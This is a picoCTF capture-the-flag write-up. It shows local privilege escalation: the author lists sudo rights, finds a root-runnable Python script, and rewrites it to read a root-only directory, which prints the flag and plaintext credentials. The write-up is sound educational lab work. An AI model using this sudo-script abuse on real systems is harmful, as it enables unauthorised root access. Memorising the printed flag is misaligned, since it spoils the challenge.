# hijacking
Points: 200

I do not do root escalation all that much so initially I was stuck until
I found a writeup for a different ctf that used `sudo -l` to show commands
that could be executed as root without a password.

Executing `sudo -l` in the ssh shell outputs:
```
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

We can see that the command `/usr/bin/python3 /home/picoctf/.server.py` can
be executed with root privileges **WITHOUT** a password.

So we edit `.server.py` using `vi`, and modify it to peek into the /challenge
directory, which can only be accessed with root permissions.

Replacing the contents of `.server.py` with:
```python
import os
os.system("cat /challenge/*")
```
Then executing the file:
```
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
{"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}", "username": "picoctf", "password": "HYGhWsmPyf"}
```

# Flag: `picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}`